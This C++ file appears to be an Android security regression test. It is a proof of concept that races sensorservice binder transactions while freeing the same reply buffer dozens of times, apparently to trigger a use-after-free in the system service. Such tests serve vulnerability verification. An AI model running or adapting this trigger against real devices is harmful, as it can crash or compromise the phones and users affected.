/**
 * Copyright (C) 2019 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include "../includes/common.h"

#if _64BIT

#include <cutils/ashmem.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <linux/futex.h>
#include <pthread.h>
#include <sensor/ISensorEventConnection.h>
#include <sensor/ISensorServer.h>
#include <sensor/Sensor.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <utils/Vector.h>

#include "IPCThreadState.h"
#include "binder/IServiceManager.h"


using namespace android;

#define SLEEP 0
#define ATTACK 1
String8 packageName("hexb1n");
String16 opPackageName("");

time_t test_started;

static volatile int attack_signal;
int my_futex(volatile int *uaddr, int op, int val,
             const struct timespec *timeout, int *uaddr2, int val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

static void *bcfree_helper(void *p) {
  (void) p;
  Parcel data, reply;
  sp<IServiceManager> sm = defaultServiceManager();
  sp<IBinder> binder = sm->getService(String16("sensorservice"));
  sp<ISensorServer> sensor = interface_cast<ISensorServer>(binder);
  sp<ISensorEventConnection> sensorEventConnection =
      sensor->createSensorEventConnection(packageName, 0 /*NORMAL*/,
                                          opPackageName);
  while (timer_active(test_started)) {
    Parcel data, reply;
    data.writeInterfaceToken(String16("android.gui.SensorEventConnection"));
    my_futex(&attack_signal, FUTEX_WAIT_PRIVATE, SLEEP, NULL, NULL, 0);
    usleep(100);
    IInterface::asBinder(sensorEventConnection)
        ->transact(4 /*FLUSH_SENSOR*/, data, &reply, 0);
  }

  return NULL;
}

static void *bcfree(void *p) {
  (void) p;
  Parcel data, reply;
  sp<IServiceManager> sm = defaultServiceManager();
  sp<IBinder> binder = sm->getService(String16("sensorservice"));
  sp<ISensorServer> sensor = interface_cast<ISensorServer>(binder);
  sp<ISensorEventConnection> sensorEventConnection =
      sensor->createSensorEventConnection(packageName, 0 /*NORMAL*/,
                                          opPackageName);
  while (timer_active(test_started)) {
    Parcel data, reply;
    data.writeInterfaceToken(String16("android.gui.SensorEventConnection"));

    {
      IInterface::asBinder(sensorEventConnection)
          ->transact(4 /*FLUSH_SENSOR*/, data, &reply, 0);
      const uint8_t *rmData = reply.data();
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
      IPCThreadState::self()->freeBuffer(NULL, rmData, 0, NULL, 0, NULL);
    }

    attack_signal = ATTACK;
    my_futex(&attack_signal, FUTEX_WAKE_PRIVATE, 1, NULL, NULL, 0);
    usleep(100);
    {
      Parcel data, reply;
      IInterface::asBinder(sensorEventConnection)
          ->transact(0xdeadbfff /*FLUSH_SENSOR*/, data, &reply, 0x2f2f);
      for (int i = 0; i < 20; i++)
        IInterface::asBinder(sensorEventConnection)
            ->transact(0xdeadbfff /*FLUSH_SENSOR*/, data, &reply, 0x2f2f);
    }
    attack_signal = SLEEP;
  }

  return NULL;
}

int main() {
  pthread_t t1, t2, t3;

  test_started = start_timer();

  pthread_create(&t1, NULL, bcfree_helper, NULL);
  pthread_create(&t2, NULL, bcfree, NULL);
  pthread_create(&t3, NULL, bcfree_helper, NULL);
  pthread_join(t1, NULL);
  pthread_join(t2, NULL);
  pthread_join(t3, NULL);
  return EXIT_SUCCESS;
}

#else
int main() {
  // do nothing on 32-bit because we can't compile on 32-bit and we need a
  // binary to push or the filepusher will break on 32-bit.
}
#endif
